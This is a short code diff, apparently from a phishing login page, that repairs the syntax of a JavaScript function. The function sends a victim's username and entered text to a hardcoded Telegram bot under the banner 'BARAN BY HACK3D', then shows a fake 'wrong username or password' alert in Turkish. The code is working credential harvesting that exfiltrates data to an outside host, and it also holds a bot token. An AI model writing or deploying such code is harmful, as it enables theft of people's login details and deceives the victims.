@@ -84,12 +84,12 @@ function sendMessage(){
   const BOT_TOKEN = "8412069744:AAH8tnhlIEujbQs6l9xayz4RH1pcK33NWv8";
   const CHAT_ID  = "7706522901";
 
-  fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage,{
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
     body:JSON.stringify({
       chat_id: CHAT_ID,
-      text: 📩 BARAN BY HACKED\n👤 Kullanıcı: ${username}\n\n💬 ${message}
+      text: `📩 BARAN BY HACK3D\n👤 Kullanıcı: ${username}\n\n💬 ${message}`
     })
   })
   .then(()=> alert("Kullanici adi veya sifre yanlis"))
